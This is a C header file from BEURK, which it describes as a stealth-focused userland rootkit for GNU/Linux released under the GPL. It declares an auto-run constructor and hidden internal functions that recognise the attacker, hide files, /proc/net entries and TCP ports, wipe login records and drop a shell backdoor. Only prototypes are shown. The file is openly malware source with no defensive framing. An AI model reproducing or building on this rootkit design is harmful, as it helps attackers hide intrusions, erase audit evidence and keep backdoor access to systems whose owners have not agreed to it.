/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#pragma once

#ifndef _BEURK_H_
# define _BEURK_H_

# include "config.h"

# if DEBUG_LEVEL > 0
#  define INTERNAL_API
# else
#  define INTERNAL_API __attribute__((visibility("hidden")))
# endif

# include <sys/socket.h> /* struct sockaddr */
# include <stdio.h> /* FILE */

/* init.c */
void        init(void) __attribute__((constructor));

/* is_attacker.c */
int         is_attacker(void) INTERNAL_API;

/* is_hidden_file.c */
int         is_hidden_file(const char *path) INTERNAL_API;

/* is_procnet.c */
int         is_procnet(const char *path) INTERNAL_API;

/* hide_tcp_ports  */
FILE        *hide_tcp_ports(const char *file) INTERNAL_API;

/* cleanup_login_records.c */
void        cleanup_login_records(const char *pty_name) INTERNAL_API;

/* drop_shell_backdoor.c */
int         drop_shell_backdoor(int sock, struct sockaddr *addr) INTERNAL_API;

#endif /* _BEURK_H_ */
